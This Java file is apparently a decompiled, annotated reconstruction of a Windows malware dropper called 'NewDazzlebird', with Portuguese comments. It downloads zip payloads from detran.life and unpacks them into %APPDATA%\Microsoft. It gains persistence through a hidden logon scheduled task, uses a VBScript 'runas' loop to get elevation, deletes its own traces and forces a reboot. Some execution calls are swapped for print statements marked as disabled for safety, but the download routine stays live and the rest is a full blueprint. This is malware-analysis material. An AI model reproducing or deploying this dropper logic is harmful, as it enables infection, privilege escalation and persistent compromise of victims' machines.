package gabtype;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;

public class NewDazzlebird {

  // variaveis de ambiente
  private static final String APPDATA = System.getenv("APPDATA");
  private static final String COMPUTER_NAME = System.getenv("COMPUTERNAME");
  private static final String USER_NAME = System.getenv("USERNAME");
  private static final String PROGRAM_FILES_X86 = System.getenv("PROGRAMFILES(X86)");
  private static final String PROCESSOR_ARCHITECTURE = System.getenv("PROCESSOR_ARCHITECTURE");

  // propriedades do sistema
  private static final String OS_NAME = System.getProperty("os.name");
  private static final String JAVA_IO_TMPDIR = System.getProperty("java.io.tmpdir");
  private static final String JAVA_HOME = System.getProperty("java.home");

  // para facilitar a leitura
  private static final String QUEBRA_DE_LINHA = "\r\n";

  // constantes do programa
  private static String URL_DETRAN_LIFE_S;
  private static String CAMINHO_PARA_APPDATA_ROAMING_MICROSOFT;
  private static String CAMINHO_PARA_ARQUIVO_APPDATA_ROAMING_MICROSOFT_NOME_DO_COMPUTADOR_ZIP;
  private static String NOME_DO_SISTEMA_OPERACIONAL;

  public static void main(String[] argumentosDoPrograma) throws IOException, URISyntaxException, InterruptedException {

    final String dataFormatadaSemBarras = new SimpleDateFormat("ddMMyyyy").format(new Date());
    final String caminhoParaArquivoAppDataDdmmyyyyReg = APPDATA + "/" + dataFormatadaSemBarras + ".REG";

    NOME_DO_SISTEMA_OPERACIONAL = OS_NAME.toLowerCase();
    CAMINHO_PARA_APPDATA_ROAMING_MICROSOFT = APPDATA + "/" + "Microsoft";
    CAMINHO_PARA_ARQUIVO_APPDATA_ROAMING_MICROSOFT_NOME_DO_COMPUTADOR_ZIP = obterCaminho(COMPUTER_NAME + ".zip");
    URL_DETRAN_LIFE_S = "http://detran.life/S/";

    if (!afirmarQueArquivoExiste(caminhoParaArquivoAppDataDdmmyyyyReg) && !NOME_DO_SISTEMA_OPERACIONAL.contains("xp")) {

      if (argumentosDoPrograma.length == 0) {

        criarVBScript(NewDazzlebird.class);
        return;

      }

      PrintWriter escritorDoArquivoUacYes = new PrintWriter(JAVA_IO_TMPDIR + "UAC.YES", "UTF-8");
      escritorDoArquivoUacYes.close();
      realizarDownload(obterUrlDoZipParaSistema32Ou64(URL_DETRAN_LIFE_S), CAMINHO_PARA_ARQUIVO_APPDATA_ROAMING_MICROSOFT_NOME_DO_COMPUTADOR_ZIP);

      if (afirmarQueArquivoExiste(CAMINHO_PARA_ARQUIVO_APPDATA_ROAMING_MICROSOFT_NOME_DO_COMPUTADOR_ZIP)) {

        matarProcessoSeHouverExeEApagarOutrosArquivosNaoJarIniXmlZip(CAMINHO_PARA_APPDATA_ROAMING_MICROSOFT);
        File arquivoAppdataRoamingMicrosoftNomeDoComputadorZip = new File(CAMINHO_PARA_ARQUIVO_APPDATA_ROAMING_MICROSOFT_NOME_DO_COMPUTADOR_ZIP);
        extrairArquivoZip(arquivoAppdataRoamingMicrosoftNomeDoComputadorZip, new File(CAMINHO_PARA_APPDATA_ROAMING_MICROSOFT));
        arquivoAppdataRoamingMicrosoftNomeDoComputadorZip.deleteOnExit();
        String caminhoParaArquivoJava0000000000000Exe = obterCaminho("Java" + System.nanoTime() + ".exe");
        File arquivoJava0000000000000Exe = new File(caminhoParaArquivoJava0000000000000Exe);
        String caminhoParaArquivoSvcsrrsExe = obterCaminho("svcsrrs.exe");
        new File(caminhoParaArquivoSvcsrrsExe).renameTo(arquivoJava0000000000000Exe);
        Thread.sleep(2000L);
        criarXML(caminhoParaArquivoJava0000000000000Exe);

      } else {

        criarVBScriptCasoExistirArgumentosDoPrograma(NewDazzlebird.class);

      }

      final File arquivoAppDataDdmmyyyyReg = new File(caminhoParaArquivoAppDataDdmmyyyyReg);
      final FileWriter escritorDoArquivoAppDataDdmmyyyyReg = new FileWriter(arquivoAppDataDdmmyyyyReg);
      escritorDoArquivoAppDataDdmmyyyyReg.close();
      
      try {
        
        if (!afirmaQuePastaProgramFilesX86Existe()) {
          
          String scriptDeBat = "@ECHO OFF" + QUEBRA_DE_LINHA + 
              "::Encrypt" + QUEBRA_DE_LINHA + 
              "(set CHAR[A]=UDFMHD45)" + QUEBRA_DE_LINHA + 
              "::Decrypt" + QUEBRA_DE_LINHA + 
              "(set CHAR[UDFMHD45]=A)" + QUEBRA_DE_LINHA + 
              "start /d \"%appdata%\\Microsoft\" Windows.exe /nogui Windows.txt" + QUEBRA_DE_LINHA + 
              "DEL \"%~f0\"";
          
          final String caminhoParaArquivoBat = obterCaminho(COMPUTER_NAME + ".bat");
          FileWriter escritorDoArquivoBat = new FileWriter(caminhoParaArquivoBat, true);
          try {
            escritorDoArquivoBat.write(scriptDeBat);
          } catch (IOException exception) {
            throw exception;
          } finally {
            escritorDoArquivoBat.close();
          }
          
          try {
            File file = new File(caminhoParaArquivoBat);
            if (file.exists()) {
              @SuppressWarnings("unused")
              String[] referenciaParaArquivoBat = new String[] { caminhoParaArquivoBat };
              
              // instrucao desativada por seguranca
              System.out.println("new ProcessBuilder(referenciaParaArquivoBat).start()");
            }
          } catch (Exception exception) {
          }
          
        }
        
        final String comando = "shutdown -f -r -t 30 -c LogOff...";
        
        // instrucao desativada por seguranca
        System.out.println("Runtime_getRuntime()_exec(" + comando + ");");
        
        
      } catch (Exception exception) {
      }
      
    }
    
    criarVBScriptCasoExistirArgumentosDoPrograma(NewDazzlebird.class);

  }

  private static void criarVBScriptCasoExistirArgumentosDoPrograma(Class<?> clazz) throws IOException, URISyntaxException {

    final File arquivoVBScriptNaPastaTemp = new File(JAVA_IO_TMPDIR, USER_NAME + System.nanoTime() + ".vbs");
    final FileWriter escritorDoArquivoVBScriptNaPastaTemp = new FileWriter(arquivoVBScriptNaPastaTemp, true);

    escritorDoArquivoVBScriptNaPastaTemp.write("On Error Resume Next" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("with CreateObject(\"Scripting.FileSystemObject\")" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write(" appScr = Replace(Wscript.ScriptFullName,chr(35),chr(32))" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("     .DeleteFile appScr" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write(" while .Fileexists(\"" + new File(clazz.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath() + "\")" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("      with CreateObject(\"Shell.Application\")" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("          .run \"taskkill /f /im java.exe\" ,0" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("          Wscript.Sleep 2000" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("      End With" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("          .DeleteFile \"" + new File(clazz.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath() + "\"" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("    Wend" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("end with" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.close();

    if (PROCESSOR_ARCHITECTURE.equals("x86")) {
      
      // instrucao desativada por seguranca
      System.out.println("Runtime_getRuntime()_exec(" + "C:\\Windows\\System32\\wscript.exe \"" + arquivoVBScriptNaPastaTemp.getAbsolutePath() + "\"" + ");");
    } else {
      
      // instrucao desativada por seguranca
      System.out.println("Runtime_getRuntime()_exec(" + "C:\\Windows\\SysWoW64\\wscript.exe \"" + arquivoVBScriptNaPastaTemp.getAbsolutePath() + "\"" + ");");
    }
    
    // instrucao desativada por seguranca
    System.out.println("Runtime_getRuntime()_exit(0);");

  }

  private static void criarXML(String caminhoDoExe) throws IOException, InterruptedException {

    final String caminhoParaArquivoJava0000000000000Exe = caminhoDoExe.replaceAll("/", "\\\\");
    final File arquivoXMLNaPastaTemp = new File(JAVA_IO_TMPDIR, USER_NAME + System.nanoTime() + "Reg32.xml");
    final FileWriter escritorDoArquivoXMLNaPastaTemp = new FileWriter(arquivoXMLNaPastaTemp, true);

    escritorDoArquivoXMLNaPastaTemp.write("<?xml version=\"1.0\" encoding=\"UTF-16\"?>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  <RegistrationInfo>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Date>2000-10-25T14:27:44.8929027</Date>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Author>" + COMPUTER_NAME + "\\" + USER_NAME + "</Author>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  </RegistrationInfo>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  <Triggers>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <LogonTrigger>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <Enabled>true</Enabled>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <UserId>" + COMPUTER_NAME + "\\" + USER_NAME + "</UserId>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    </LogonTrigger>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <RegistrationTrigger>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <Enabled>false</Enabled>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    </RegistrationTrigger>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  </Triggers>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  <Principals>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Principal id=\"Author\">" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <UserId>" + COMPUTER_NAME + "\\" + USER_NAME + "</UserId>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <LogonType>InteractiveToken</LogonType>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <RunLevel>HighestAvailable</RunLevel>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    </Principal>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  </Principals>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  <Settings>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <AllowHardTerminate>false</AllowHardTerminate>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <StartWhenAvailable>true</StartWhenAvailable>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <IdleSettings>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <StopOnIdleEnd>true</StopOnIdleEnd>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <RestartOnIdle>false</RestartOnIdle>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    </IdleSettings>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <AllowStartOnDemand>true</AllowStartOnDemand>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Enabled>true</Enabled>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Hidden>true</Hidden>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <RunOnlyIfIdle>false</RunOnlyIfIdle>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <WakeToRun>false</WakeToRun>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Priority>7</Priority>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  </Settings>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  <Actions Context=\"Author\">" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    <Exec>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <Command>" + caminhoParaArquivoJava0000000000000Exe + "</Command>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("      <Arguments></Arguments>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("    </Exec>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("  </Actions>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.write("</Task>" + QUEBRA_DE_LINHA);
    escritorDoArquivoXMLNaPastaTemp.close();

    Thread.sleep(2000L);
    final String comando = "schtasks /Create /TN \"Java" + System.nanoTime() + "\"  /xml \"" + arquivoXMLNaPastaTemp.getAbsolutePath() + "\"";
    
    // instrucao desativada por seguranca
    System.out.println("Runtime_getRuntime()_exec(" + comando + ");");
    Thread.sleep(5000L);

  }

  private static void extrairArquivoZip(File arquivoAppdataRoamingMicrosoftNomeDoComputadorZip, File pastaAppDataRoamingMicrosoft) throws IOException {

    InputStream inputStream = null;
    FileOutputStream fileOutputStream = null;
    ZipFile arquivoZip = null;
    try {
      if (!pastaAppDataRoamingMicrosoft.exists()) {
        pastaAppDataRoamingMicrosoft.mkdirs();
      }
      if (!pastaAppDataRoamingMicrosoft.exists() || !pastaAppDataRoamingMicrosoft.isDirectory()) {
        throw new IOException();
      }
      arquivoZip = new ZipFile(arquivoAppdataRoamingMicrosoftNomeDoComputadorZip);
      File arquivoForaDoZip = null;
      while (arquivoZip.entries().hasMoreElements()) {
        ZipEntry arquivoDentroDoZip = arquivoZip.entries().nextElement();
        arquivoForaDoZip = new File(pastaAppDataRoamingMicrosoft, arquivoDentroDoZip.getName());
        
        // nao compreendi o motivo dessa verificacao que esta comentada
        if (/* !arquivoDentroDoZip.isDirectory() || */ arquivoForaDoZip.exists()) {
          break;
        }
        arquivoForaDoZip.mkdirs();
        try {
          inputStream = arquivoZip.getInputStream(arquivoDentroDoZip);
          fileOutputStream = new FileOutputStream(arquivoForaDoZip);
          if (inputStream == null) {
            throw new ZipException();
          }
          int bytesActuallyRead;
          byte[] buffer = new byte[1025];
          while ((bytesActuallyRead = inputStream.read(buffer)) > 0) {
            fileOutputStream.write(buffer, 0, bytesActuallyRead);
          }
          if (inputStream != null) {
            try {
              inputStream.close();
            } catch (Exception exception) {
            }
          }
          try {
            fileOutputStream.close();
          } catch (Exception exception) {
          }
        } finally {
          if (inputStream != null) {
            try {
              inputStream.close();
            } catch (Exception exception) {
            }
          }
          if (fileOutputStream != null) {
            try {
              fileOutputStream.close();
            } catch (Exception exception) {
            }
          }
        }
      }
      if (!arquivoForaDoZip.getParentFile().exists()) {
        arquivoForaDoZip.getParentFile().mkdirs();
      }
    } finally {
      if (arquivoZip != null) {
        try {
          arquivoZip.close();
        } catch (Exception exception) {
        }
      }
    }

  }

  private static void matarProcessoSeHouverExeEApagarOutrosArquivosNaoJarIniXmlZip(String caminhoParaAppdataRoamingMicrosoft) {

    final File[] arquivosDaPastaAppdataRoamingMicrosoft = new File(caminhoParaAppdataRoamingMicrosoft).listFiles();
    if (arquivosDaPastaAppdataRoamingMicrosoft != null) {
      int i = arquivosDaPastaAppdataRoamingMicrosoft.length;
      for (int j = 0; j < i; j++) {
        final File arquivoCorrente = arquivosDaPastaAppdataRoamingMicrosoft[j];
        if (arquivoCorrente.isFile() && !arquivoCorrente.isDirectory()) {
          if (arquivoCorrente.getName().contains(".exe")) {
            try {
              final String comando = "taskkill /f /im " + arquivoCorrente.getName();
              
              // instrucao desativada por seguranca
              System.out.println("Runtime_getRuntime()_exec(" + comando + ");");
              Thread.sleep(2000L);
            } catch (Exception exception) {
            }
          }
          if (!arquivoCorrente.getName().contains(".jar") && !arquivoCorrente.getName().contains(".ini") && !arquivoCorrente.getName().contains(".xml") && !arquivoCorrente.getName().contains(".zip")) {
            arquivoCorrente.delete();
          }
        }
      }
    }

  }

  private static void realizarDownload(String urlDoArquivo, String caminhoParaSalvarArquivo) throws MalformedURLException, IOException {

    BufferedInputStream bufferedInputStream = null;
    FileOutputStream fileOutputStream = null;
    try {
      bufferedInputStream = new BufferedInputStream(new URL(urlDoArquivo).openStream());
      fileOutputStream = new FileOutputStream(caminhoParaSalvarArquivo);
      byte[] buffer = new byte[1025];
      int bytesActuallyRead;
      while ((bytesActuallyRead = bufferedInputStream.read(buffer, 0, 1024)) != -1) {
        fileOutputStream.write(buffer, 0, bytesActuallyRead);
      }
      bufferedInputStream.close();
      fileOutputStream.close();
    } finally {
      if (bufferedInputStream != null) {
        bufferedInputStream.close();
      }
      if (fileOutputStream != null) {
        fileOutputStream.close();
      }
    }

  }

  private static boolean afirmaQuePastaProgramFilesX86Existe() {

    return PROGRAM_FILES_X86 != null;

  }

  private static String obterUrlDoZipParaSistema32Ou64(String urlDetranLifeS) {

    return urlDetranLifeS + (!afirmaQuePastaProgramFilesX86Existe() ? "/Win32.zip" : "/Win64.zip");

  }

  private static String obterCaminho(String nomeDoComputadorComZip) {

    final String caminhoparaArquivoAppdataRoamingMicrosoftNomeDoComputadorZip = CAMINHO_PARA_APPDATA_ROAMING_MICROSOFT + "/" + nomeDoComputadorComZip;
    return caminhoparaArquivoAppdataRoamingMicrosoftNomeDoComputadorZip.replaceAll("/", "\\\\");

  }

  private static boolean afirmarQueArquivoExiste(String caminho) {

    return new File(caminho).exists();

  }

  private static void criarVBScript(Class<?> clazz) throws IOException, URISyntaxException {

    final String caminhoDaPastaTemp = JAVA_IO_TMPDIR;
    final File arquivoVBScriptNaPastaTemp = new File(caminhoDaPastaTemp, USER_NAME + System.nanoTime() + ".vbs");
    final FileWriter escritorDoArquivoVBScriptNaPastaTemp = new FileWriter(arquivoVBScriptNaPastaTemp, true);
    final String caminhoAbsolutoDestaClasse = new File(clazz.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
    final String localDeInstalacaoDaJVM = JAVA_HOME + "\\bin\\java.exe";

    escritorDoArquivoVBScriptNaPastaTemp.write("On Error Resume Next" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("with CreateObject(\"Scripting.FileSystemObject\")" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("	appScr = Replace(Wscript.ScriptFullName,chr(35),chr(32))" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("			.DeleteFile appScr" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("	appUAC = \"" + caminhoDaPastaTemp + "UAC.YES" + "\"" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("	while not .Fileexists(appUAC) " + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("    with CreateObject(\"Shell.Application\")" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("          .ShellExecute \"" + localDeInstalacaoDaJVM + "\",\"-jar \"\"" + caminhoAbsolutoDestaClasse + "\"\" 0\",,\"runas\",0" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("    End With" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("      Wscript.Sleep 3000" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("    Wend" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("		if .Fileexists(appUAC) then" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("                  Wscript.Sleep 1500" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("			.DeleteFile appUAC" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("		end If" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.write("End With" + QUEBRA_DE_LINHA);
    escritorDoArquivoVBScriptNaPastaTemp.close();

    // instrucao desativada por seguranca
    System.out.println("Runtime_getRuntime()_exec(\"C:\\Windows\\System32\\wscript.exe \"" + arquivoVBScriptNaPastaTemp.getAbsolutePath() + "\");");
    System.out.println("Runtime_getRuntime()_exit(0);");

  }

  // usada para decodificar strings codificadas, todas as strings foram decodificadas
  // um exemplo de string codificada eh BB1144A0DC67D17AC2 que corresponde a ddMMyyyy
  @SuppressWarnings("unused")
  private static String decodificar(String codificada) {
    
    long l1 = Integer.decode("0x" + codificada.substring(0, 2)).intValue();
    int i = 3;
    String str = "";
    do {
      long l2;
      int j;
      if ((j = (int) ((l2 = Integer.decode("0x" + codificada.substring(i - 1, i + 1)).intValue()) ^ 0x31)) <= l1) {
        j = (int) (j + 255 - l1);
      } else {
        j = (int) (j - l1);
      }
      str = str + (char) j;
      l1 = l2;
    } while ((i += 2) < codificada.length());
    return str;
    
  }

}
